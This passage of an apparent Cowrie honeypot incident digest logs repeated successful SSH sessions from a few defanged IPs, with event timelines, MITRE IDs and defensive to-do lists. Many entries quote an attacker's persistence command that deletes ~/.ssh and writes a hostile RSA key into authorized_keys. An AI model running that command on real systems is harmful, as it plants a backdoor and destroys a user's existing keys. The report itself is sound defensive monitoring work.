|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:24 |
| **Last Seen** | 2026-06-02 19:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:24:58` | `cowrie.session.connect` |
| `2026-06-02 19:24:58` | `cowrie.client.version` |
| `2026-06-02 19:24:58` | `cowrie.client.kex` |
| `2026-06-02 19:24:58` | `cowrie.login.success` |
| `2026-06-02 19:24:59` | `cowrie.session.params` |
| `2026-06-02 19:24:59` | `cowrie.command.input` |
| `2026-06-02 19:24:59` | `cowrie.command.failed` |
| `2026-06-02 19:24:59` | `cowrie.log.closed` |
| `2026-06-02 19:24:59` | `cowrie.session.params` |
| `2026-06-02 19:24:59` | `cowrie.command.input` |
| `2026-06-02 19:24:59` | `cowrie.session.file_download` |
| `2026-06-02 19:24:59` | `cowrie.log.closed` |
| `2026-06-02 19:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d59871f74f42

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:25 |
| **Last Seen** | 2026-06-02 19:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:25:01` | `cowrie.session.connect` |
| `2026-06-02 19:25:01` | `cowrie.client.version` |
| `2026-06-02 19:25:01` | `cowrie.client.kex` |
| `2026-06-02 19:25:01` | `cowrie.login.success` |
| `2026-06-02 19:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb22a4a386d0

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:26 |
| **Last Seen** | 2026-06-02 19:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:26:45` | `cowrie.session.connect` |
| `2026-06-02 19:26:45` | `cowrie.client.version` |
| `2026-06-02 19:26:45` | `cowrie.client.kex` |
| `2026-06-02 19:26:46` | `cowrie.login.success` |
| `2026-06-02 19:26:46` | `cowrie.session.params` |
| `2026-06-02 19:26:46` | `cowrie.command.input` |
| `2026-06-02 19:26:46` | `cowrie.command.failed` |
| `2026-06-02 19:26:46` | `cowrie.log.closed` |
| `2026-06-02 19:26:46` | `cowrie.session.params` |
| `2026-06-02 19:26:46` | `cowrie.command.input` |
| `2026-06-02 19:26:46` | `cowrie.session.file_download` |
| `2026-06-02 19:26:46` | `cowrie.log.closed` |
| `2026-06-02 19:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751d39ff1e7a

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:26 |
| **Last Seen** | 2026-06-02 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:26:48` | `cowrie.session.connect` |
| `2026-06-02 19:26:48` | `cowrie.client.version` |
| `2026-06-02 19:26:48` | `cowrie.client.kex` |
| `2026-06-02 19:26:48` | `cowrie.login.success` |
| `2026-06-02 19:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203086c863f3

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:30 |
| **Last Seen** | 2026-06-02 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:30:29` | `cowrie.session.connect` |
| `2026-06-02 19:30:29` | `cowrie.client.version` |
| `2026-06-02 19:30:29` | `cowrie.client.kex` |
| `2026-06-02 19:30:29` | `cowrie.login.success` |
| `2026-06-02 19:30:30` | `cowrie.session.params` |
| `2026-06-02 19:30:30` | `cowrie.command.input` |
| `2026-06-02 19:30:30` | `cowrie.command.failed` |
| `2026-06-02 19:30:30` | `cowrie.log.closed` |
| `2026-06-02 19:30:30` | `cowrie.session.params` |
| `2026-06-02 19:30:30` | `cowrie.command.input` |
| `2026-06-02 19:30:30` | `cowrie.session.file_download` |
| `2026-06-02 19:30:30` | `cowrie.log.closed` |
| `2026-06-02 19:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3c88144fb8

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:30 |
| **Last Seen** | 2026-06-02 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:30:32` | `cowrie.session.connect` |
| `2026-06-02 19:30:32` | `cowrie.client.version` |
| `2026-06-02 19:30:32` | `cowrie.client.kex` |
| `2026-06-02 19:30:32` | `cowrie.login.success` |
| `2026-06-02 19:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ef0712a614

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:33 |
| **Last Seen** | 2026-06-02 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:33:58` | `cowrie.session.connect` |
| `2026-06-02 19:33:58` | `cowrie.client.version` |
| `2026-06-02 19:33:58` | `cowrie.client.kex` |
| `2026-06-02 19:33:59` | `cowrie.login.success` |
| `2026-06-02 19:33:59` | `cowrie.session.params` |
| `2026-06-02 19:33:59` | `cowrie.command.input` |
| `2026-06-02 19:33:59` | `cowrie.command.failed` |
| `2026-06-02 19:33:59` | `cowrie.log.closed` |
| `2026-06-02 19:33:59` | `cowrie.session.params` |
| `2026-06-02 19:33:59` | `cowrie.command.input` |
| `2026-06-02 19:33:59` | `cowrie.session.file_download` |
| `2026-06-02 19:33:59` | `cowrie.log.closed` |
| `2026-06-02 19:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f538439e5b88

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:34 |
| **Last Seen** | 2026-06-02 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:34:01` | `cowrie.session.connect` |
| `2026-06-02 19:34:01` | `cowrie.client.version` |
| `2026-06-02 19:34:01` | `cowrie.client.kex` |
| `2026-06-02 19:34:01` | `cowrie.login.success` |
| `2026-06-02 19:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9864626ca06b

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:35 |
| **Last Seen** | 2026-06-02 19:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:35:45` | `cowrie.session.connect` |
| `2026-06-02 19:35:45` | `cowrie.client.version` |
| `2026-06-02 19:35:45` | `cowrie.client.kex` |
| `2026-06-02 19:35:46` | `cowrie.login.success` |
| `2026-06-02 19:35:46` | `cowrie.session.params` |
| `2026-06-02 19:35:46` | `cowrie.command.input` |
| `2026-06-02 19:35:46` | `cowrie.command.failed` |
| `2026-06-02 19:35:46` | `cowrie.log.closed` |
| `2026-06-02 19:35:46` | `cowrie.session.params` |
| `2026-06-02 19:35:46` | `cowrie.command.input` |
| `2026-06-02 19:35:46` | `cowrie.session.file_download` |
| `2026-06-02 19:35:46` | `cowrie.log.closed` |
| `2026-06-02 19:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834eed36e2de

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:35 |
| **Last Seen** | 2026-06-02 19:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:35:48` | `cowrie.session.connect` |
| `2026-06-02 19:35:48` | `cowrie.client.version` |
| `2026-06-02 19:35:48` | `cowrie.client.kex` |
| `2026-06-02 19:35:49` | `cowrie.login.success` |
| `2026-06-02 19:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c86c98de8c4b

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:39 |
| **Last Seen** | 2026-06-02 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:39:12` | `cowrie.session.connect` |
| `2026-06-02 19:39:12` | `cowrie.client.version` |
| `2026-06-02 19:39:12` | `cowrie.client.kex` |
| `2026-06-02 19:39:13` | `cowrie.login.success` |
| `2026-06-02 19:39:13` | `cowrie.session.params` |
| `2026-06-02 19:39:13` | `cowrie.command.input` |
| `2026-06-02 19:39:13` | `cowrie.command.failed` |
| `2026-06-02 19:39:13` | `cowrie.log.closed` |
| `2026-06-02 19:39:13` | `cowrie.session.params` |
| `2026-06-02 19:39:13` | `cowrie.command.input` |
| `2026-06-02 19:39:13` | `cowrie.session.file_download` |
| `2026-06-02 19:39:13` | `cowrie.log.closed` |
| `2026-06-02 19:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22740e29d2ef

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:39 |
| **Last Seen** | 2026-06-02 19:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:39:15` | `cowrie.session.connect` |
| `2026-06-02 19:39:15` | `cowrie.client.version` |
| `2026-06-02 19:39:15` | `cowrie.client.kex` |
| `2026-06-02 19:39:15` | `cowrie.login.success` |
| `2026-06-02 19:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4635e404bf7c

| Field | Detail |
|---|---|
| **Source IP** | `122.166.49[.]42` |
| **First Seen** | 2026-06-02 19:48 |
| **Last Seen** | 2026-06-02 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:48:49` | `cowrie.session.connect` |
| `2026-06-02 19:48:49` | `cowrie.client.version` |
| `2026-06-02 19:48:49` | `cowrie.client.kex` |
| `2026-06-02 19:48:49` | `cowrie.login.success` |
| `2026-06-02 19:48:49` | `cowrie.session.params` |
| `2026-06-02 19:48:49` | `cowrie.command.input` |
| `2026-06-02 19:48:49` | `cowrie.command.failed` |
| `2026-06-02 19:48:49` | `cowrie.log.closed` |
| `2026-06-02 19:48:49` | `cowrie.session.params` |
| `2026-06-02 19:48:49` | `cowrie.command.input` |
| `2026-06-02 19:48:49` | `cowrie.session.file_download` |
| `2026-06-02 19:48:49` | `cowrie.log.closed` |
| `2026-06-02 19:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.49[.]42` to AbuseIPDB if not already reported
- [ ] Block `122.166.49[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086e97849cb5

| Field | Detail |
|---|---|
| **Source IP** | `122.166.49[.]42` |
| **First Seen** | 2026-06-02 19:48 |
| **Last Seen** | 2026-06-02 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:48:50` | `cowrie.session.connect` |
| `2026-06-02 19:48:50` | `cowrie.client.version` |
| `2026-06-02 19:48:50` | `cowrie.client.kex` |
| `2026-06-02 19:48:51` | `cowrie.login.success` |
| `2026-06-02 19:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.49[.]42` to AbuseIPDB if not already reported
- [ ] Block `122.166.49[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d05a0b2ed64b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.199[.]36` |
| **First Seen** | 2026-06-02 20:12 |
| **Last Seen** | 2026-06-02 20:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:12:15` | `cowrie.session.connect` |
| `2026-06-02 20:12:15` | `cowrie.client.version` |
| `2026-06-02 20:12:15` | `cowrie.client.kex` |
| `2026-06-02 20:12:16` | `cowrie.login.success` |
| `2026-06-02 20:12:16` | `cowrie.session.params` |
| `2026-06-02 20:12:16` | `cowrie.command.input` |
| `2026-06-02 20:12:16` | `cowrie.command.failed` |
| `2026-06-02 20:12:17` | `cowrie.log.closed` |
| `2026-06-02 20:12:17` | `cowrie.session.params` |
| `2026-06-02 20:12:17` | `cowrie.command.input` |
| `2026-06-02 20:12:17` | `cowrie.session.file_download` |
| `2026-06-02 20:12:17` | `cowrie.log.closed` |
| `2026-06-02 20:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.199[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.199[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8a3b55bb46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.199[.]36` |
| **First Seen** | 2026-06-02 20:12 |
| **Last Seen** | 2026-06-02 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:12:19` | `cowrie.session.connect` |
| `2026-06-02 20:12:19` | `cowrie.client.version` |
| `2026-06-02 20:12:19` | `cowrie.client.kex` |
| `2026-06-02 20:12:20` | `cowrie.login.success` |
| `2026-06-02 20:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.199[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.199[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e362c7cdfd4

| Field | Detail |
|---|---|
| **Source IP** | `192.142.2[.]40` |
| **First Seen** | 2026-06-02 20:15 |
| **Last Seen** | 2026-06-02 20:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:15:46` | `cowrie.session.connect` |
| `2026-06-02 20:15:46` | `cowrie.client.version` |
